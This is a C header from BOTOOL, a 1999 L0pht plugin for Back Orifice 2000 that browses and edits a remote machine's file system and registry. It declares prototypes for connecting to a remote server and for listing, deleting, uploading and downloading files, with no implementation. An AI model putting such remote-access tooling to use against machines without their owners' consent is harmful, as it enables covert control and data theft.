/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_EXPLOREFUNC_H
#define __INC_EXPLOREFUNC_H

#include<windows.h>
#include"explore.h"

typedef struct {
	HWND hParent;
} THREAD_ARGS;

#define WM_ENABLEITEMS (WM_USER+1)
#define WM_GOTOLOCATION (WM_USER+2)

#define IDC_STATUS 3000

void BreakDownCommand(BYTE *pInBuffer, int *cmdlen, int *command, int *comid, int *nArg1, char **svArg2, char **svArg3);
int CALLBACK SortListItems(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
int ExploreConnect(EXPLORE_CONTEXT *excontext);
BOOL ExploreDisconnect(EXPLORE_CONTEXT *excontext);
void UpdateFileList(EXPLORE_CONTEXT *excontext);
void GoToDirectory(EXPLORE_CONTEXT *excontext);
void CreateNewFolder(EXPLORE_CONTEXT *excontext);
BOOL RenameItem(EXPLORE_CONTEXT *excontext, char *svOldName, char *svNewName, BOOL bCopy, BOOL bRelative);
void DeleteItems(EXPLORE_CONTEXT *excontext);
void UploadFile(EXPLORE_CONTEXT *excontext,char *svFullName);
void DownloadFile(EXPLORE_CONTEXT *excontext, char *svSrcPath, char *svDstPath);

#endif